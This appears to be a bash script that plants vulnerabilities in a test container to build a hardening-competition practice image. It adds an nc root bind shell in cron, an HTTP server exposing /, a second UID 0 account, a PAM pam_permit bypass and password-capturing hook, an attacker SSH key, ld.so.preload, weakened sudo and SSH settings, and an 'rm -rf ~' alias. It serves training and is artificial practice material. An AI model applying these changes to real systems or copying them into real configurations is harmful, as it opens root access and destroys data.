#!/bin/bash
# !!! TEST CONTAINER ONLY - plants an intro-round style Linux Mint 21 image. Never run on a real image. !!!
# Fictional README for this image:
#   Authorized administrators: cpuser (you), alice
#   Authorized users: bob carol dave frank
#   Critical services: OpenSSH server.  No other services or hacking tools are authorized.
set -u
# ---- test-env fix: no IPv6 in this container kernel
mkdir -p /etc/systemd/system/vsftpd.service.d
printf '# TEST-CONTAINER ONLY: kernel has no IPv6\n[Service]\nExecStart=\nExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf -olisten=YES -olisten_ipv6=NO\n' > /etc/systemd/system/vsftpd.service.d/cptest-noipv6.conf
systemctl daemon-reload; systemctl restart vsftpd

# ---- users
for u in alice bob carol dave frank eve mallory; do id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"; done
echo 'alice:Alic3-Adm1n!' | chpasswd; echo 'bob:password' | chpasswd; echo 'dave:dave' | chpasswd; echo 'frank:Fr4nk-Us3r!' | chpasswd
echo 'eve:hunter2' | chpasswd; echo 'mallory:mallory' | chpasswd
usermod -p '' carol                                   # empty password
usermod -aG lpadmin alice                             # alice: authorized admin but NOT in sudo (only lpadmin)
usermod -aG sudo,adm bob                              # bob: normal user with admin rights
usermod -aG sudo mallory                              # unauthorized user who is also an admin
useradd -r -u 998 -m -d /home/sysbackup -s /bin/bash sysbackup; echo 'sysbackup:backup' | chpasswd   # hidden "system" user
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash toor; echo 'toor:toor' | chpasswd                      # second UID 0
printf 'bob ALL=(ALL) NOPASSWD: ALL\n' > /etc/sudoers.d/90-cloud-init-users; chmod 440 /etc/sudoers.d/90-cloud-init-users
groupadd -f hackers; usermod -aG hackers eve

# ---- display manager
printf '[Seat:*]\nautologin-user=bob\nautologin-user-timeout=0\nallow-guest=true\n' > /etc/lightdm/lightdm.conf
mkdir -p /etc/lightdm/lightdm.conf.d; printf '[Seat:*]\nautologin-user = nancy\n' > /etc/lightdm/lightdm.conf.d/80-autologin.conf

# ---- packages: hold one hacking tool so apt refuses to remove it
apt-mark hold john >/dev/null

# ---- files
mkdir -p /home/bob/Music /home/carol/Videos /home/dave/.local/share/.cache /usr/share/fonts/truetype/.x
head -c 200000 /dev/urandom > /home/bob/Music/never_gonna.mp3
head -c 300000 /dev/urandom > /home/carol/Videos/movie.mp4
head -c 100000 /dev/urandom > /home/dave/.local/share/.cache/stash.ogg
head -c 100000 /dev/urandom > /usr/share/fonts/truetype/.x/track01.mp3      # hidden under /usr/share
printf 'alice:Alic3-Adm1n!\nbob:password\n' > /home/bob/passwords.txt
chown -R bob: /home/bob; chown -R carol: /home/carol; chown -R dave: /home/dave

# ---- backdoors
printf '* * * * * root /bin/nc.traditional -l -p 4444 -e /bin/bash >/dev/null 2>&1\n' > /etc/cron.d/0hourly-sync
cat > /etc/systemd/system/system-sync.service <<'EOF'
[Unit]
Description=System sync helper
[Service]
ExecStart=/usr/bin/python3 -m http.server 31337 --directory /
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload; systemctl enable --now system-sync.service >/dev/null 2>&1

# ---- system config plants (Mint-relevant subset of tools/verify/plant.sh)
cat >> /etc/sysctl.conf <<'X'
net.ipv4.tcp_syncookies=0
net.ipv4.ip_forward=1
net.ipv4.conf.all.accept_source_route = 1
net.ipv4.conf.all.send_redirects=1
net.ipv4.conf.all.accept_redirects = 1
kernel.randomize_va_space=0
fs.suid_dumpable = 2
X
printf 'net.ipv4.ip_forward = 1\n' > /etc/sysctl.d/99-zz-net.conf
cp /usr/share/openssh/sshd_config /etc/ssh/sshd_config; printf 'PermitRootLogin yes\nPermitEmptyPasswords yes\n' >> /etc/ssh/sshd_config; chown bob /etc/ssh/sshd_config
printf 'PermitRootLogin yes\n' > /etc/ssh/sshd_config.d/60-evil.conf
mkdir -p /home/eve/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyEvilKeyEvilKeyEvilKeyEvilKey00000 eve@kali' > /root/.ssh_authorized_tmp
mkdir -p /root/.ssh; mv /root/.ssh_authorized_tmp /root/.ssh/authorized_keys
sed -i 's/^ENCRYPT_METHOD.*/ENCRYPT_METHOD MD5/; s/^PASS_MAX_DAYS.*/PASS_MAX_DAYS\t99999/' /etc/login.defs
sed -i 's/requisite\([[:space:]]*\)pam_deny.so/requisite\1pam_permit.so/' /etc/pam.d/common-auth
sed -i 's/pam_unix.so nullok/pam_unix.so nullok/' /etc/pam.d/common-auth
sed -i '1i auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd' /etc/pam.d/common-auth
usermod -s /bin/bash syslog
chown bob /home; touch /swapfile; chmod 644 /swapfile
chmod u+s /usr/bin/cp
echo 'fake' > /usr/src/evil_rabbit.so; echo /usr/src/evil_rabbit.so > /etc/ld.so.preload
grep -q GOODBYE /etc/bash.bashrc || echo "alias GOODBYE='rm -rf ~'" >> /etc/bash.bashrc
sed -i 's/^bin:[^:]*:/bin:$6$x$abcdefgh:/' /etc/shadow
sed -i 's/^root:[^:]*:/root:$6$grp$abc:/' /etc/gshadow
chmod 644 /etc/shadow
grep -q '!env_reset' /etc/sudoers || printf 'Defaults !env_reset\nDefaults env_keep += "PATH"\n' >> /etc/sudoers
setfacl -m u:bob:rwx /usr/bin/sudo
echo planted
